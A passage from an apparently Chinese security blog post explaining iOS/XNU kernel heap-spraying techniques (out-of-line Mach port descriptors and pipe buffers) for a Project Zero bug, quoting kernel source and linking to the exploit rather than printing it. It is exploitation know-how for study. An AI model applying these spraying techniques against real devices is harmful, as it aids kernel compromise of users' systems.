((dsc-&gt;disposition == MACH_MSG_TYPE_PORT_RECEIVE) &amp;&amp;</span><br><span class="line">                ipc_port_check_circularity(</span><br><span class="line">                    (<span class="type">ipc_port_t</span>) object,</span><br><span class="line">                    (<span class="type">ipc_port_t</span>) dest))</span><br><span class="line">            kmsg-&gt;ikm_header-&gt;msgh_bits |= MACH_MSGH_BITS_CIRCULAR;</span><br><span class="line"></span><br><span class="line">        objects[i] = object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> user_dsc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里使用<code>kalloc</code>分配内存，然后转换为<code>ipc_object_t</code>类型，这是一个端口指针的数组。因此可以使用<code>OOL</code>端口描述符发送大量<code>Mach</code>消息，可以使用有效指针或<code>0xFFFFFFFFFFFFFFFFFF(MACH_PORT_DEAD)</code>或<code>0x0000000000000000(MACH_PORT_NULL)</code>填充<code>kalloc zone</code>。</p>
<h2 id="管道缓冲区"><a href="#管道缓冲区" class="headerlink" title="管道缓冲区"></a>管道缓冲区</h2><p>管道是xnu中另一个用于IPC的系统调用。它创建一个 分配一对文件描述符并允许单向数据流的管道。数据流经的缓冲区称为管道缓冲区。可以从缓冲区的读取端读取写入缓冲区的写入端的数据，但是不能反过来。基本上你可以在同一地址空间中进行读写。另一个重要的事情是它占用内核虚拟地址空间，因此是在堆中分配内存的有用原语。默认情况管道缓冲区的大小设置为最大16384字节，所有管道缓冲区的大小设置为最大16MB。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Pipe buffer size, keep moderate in value, pipes take kva space.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PIPE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_SIZE	16384</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_KVAMAX	(1024 * 1024 * 16)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BIG_PIPE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BIG_PIPE_SIZE	(64*1024)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SMALL_PIPE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALL_PIPE_SIZE	PAGE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>如果数据已被写入管道缓冲区并且管道缓冲区已满，则认为该管道缓冲区已阻塞。要释放该管道缓冲区必须从中读取数据。可以通过分配许多管道缓冲区并将数据写入其中来利用管道缓冲区进行喷射。可以创建的管道总数是16MB除以16384字节，即1024。</p>
<p>管道缓冲区的优势在于，如果能够获得指向其中一个管道缓冲区的指针并读取其值，则基本上可以识别出是这1024个管道缓冲区中的哪个，然后就可以在这个特定的管道缓冲区中重新分配数据。</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>也可以直接去看<a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=377026&signed_aid=RWxVCY6jN3pZa8F0_0iOhg==">Exp</a>，里面注释很详细。</p>
<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1731">Project Zero Issue tracker</a></p>
<p>[iOS 10 - Kernel Heap Revisited](<a target="_blank" rel="noopener" href="https://gsec.hitb.org/materials/sg2016/D2">https://gsec.hitb.org/materials/sg2016/D2</a> - Stefan Esser - iOS 10 Kernel Heap Revisited.pdf)</p>
<p><a target="_blank" rel="noopener" href="https://www.amazon.com/Mac-OS-Internals-Approach-paperback/dp/0134426541">Mac OS X Internals: A Systems Approach</a></p>
<p><a target="_blank" rel="noopener" href="https://www.amazon.com/MacOS-iOS-Internals-III-Insecurity/dp/0991055535">MacOS and iOS Internals, Volume III: Security &amp; Insecurity</a></p>
<p><a target="_blank" rel="noopener" href="https://www.slideshare.net/i0n1c/cansecwest-2017-portal-to-the-ios-core">CanSecWest 2017 - Port(al) to the iOS Core</a></p>
<p><a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1731">Project Zero Issue tracker</a></p>
<p>[iOS 10 - Kernel Heap Revisited](<a target="_blank" rel="noopener" href="https://gsec.hitb.org/materials/sg2016/D2">https://gsec.hitb.org/materials/sg2016/D2</a> - Stefan Esser - iOS 10 Kernel Heap Revisited.pdf)</p>
<p><a target="_blank" rel="noopener" href="https://www.amazon.com/Mac-OS-Internals-Approach-paperback/dp/0134426541">Mac OS X Internals: A Systems Approach</a></p>
<p><a target="_blank" rel="noopener" href="https://www.amazon.com/MacOS-iOS-Internals-III-Insecurity/dp/0991055535">MacOS and iOS Internals, Volume III: Security &amp; Insecurity</a></p>
<p><a target="_blank" rel="noopener" href="https://www.slideshare.net/i0n1c/cansecwest-2017-portal-to-the-ios-core">CanSecWest 2017 - Port(al) to the iOS Core</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" title="Previous page" aria-label="Previous page" href="/page/32/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/32/">32</a><span class="page-number current">33</span><a class="page-number" href="/page/34/">34</a><span class="space">&hellip;</span><a class="page-number" href="/page/56/">56</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/34/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">buffer0verflooow</span>
  </div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
